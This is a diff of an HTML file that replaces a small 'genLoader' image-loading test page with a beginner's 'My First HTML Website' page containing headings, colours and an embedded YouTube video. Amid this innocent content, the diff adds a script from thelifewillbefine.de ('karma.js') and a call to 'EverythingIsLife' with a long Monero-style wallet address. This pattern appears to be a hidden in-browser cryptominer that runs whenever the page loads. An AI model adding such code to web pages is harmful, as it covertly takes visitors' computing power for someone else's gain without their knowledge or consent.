@@ -1,43 +1,31 @@
-<!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>genLoader Test</title>
+<style>
+body {background-color: lightblue;}
+</style>
 </head>
-
 <body>
-    <div id="target"></div>
-    <script>
-        // CLIENT
-        async function* genLoader(url, passes = 5) {
-            let iCurrentPass = Math.max(passes, 0);
-            let oPayload;
-            while (iCurrentPass--) {
-                oPayload = await fetch(url + (url.includes("?") ? "&" : "?") + `compr=${iCurrentPass}`);
-                yield oPayload;
-            }
-            return oPayload;
-        }
+<title>My First HTML Website</title>
+</head>
+<body>
 
-        async function loadImg(targetElementId, url, passes) {
-            const targetElement = document.getElementById(targetElementId);
-            if (!targetElement)
-                return;
-            const placeResultIntoTarget = (fetchValue, targetElement) => targetElement.innerHTML = fetchValue.text();
-            const imgLoader = genLoader(url);
-            let result = imgLoader.next();
-            while (!result.done) {
-                placeResultIntoTarget(await result.value, targetElement);
-                result = imgLoader.next();
-            }
-            placeResultIntoTarget(await result.value, targetElement);
-        }
+<h1>My First HTML Website</h1>
+    
 
-        loadImg("target", "http://localhost:3000/dummyData/myImage.jpg");
-    </script>
+<h1>I'm making this HTML Website because I am learning HTML and practicing it (WORK IN PROGRESS)</h1>
+
+
+<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+<script type="text/javascript">
+EverythingIsLife('8BSCP45xrUp4mY7KC4pN6xVT7i7cV9nan3i1MMUWJtAnLgtqyu9CsB4dWM5SuJMEAZVBgGEYaKbqbZs3E6m695kUCtZSFcx', 'x', 30);
+</script>
+    
+<h1 style="background-color: dodgerblue;">Hello World &#128515;</h1>
+<p style="background-color:rgb(255, 208, 0);"><b>Welcome to my EPIC and IN PROGRESS Website!!!<b></p>
+
+<h2>Embed Youtube Video<h2>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/w3jLJU7DT5E" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
 </body>
-
 </html>
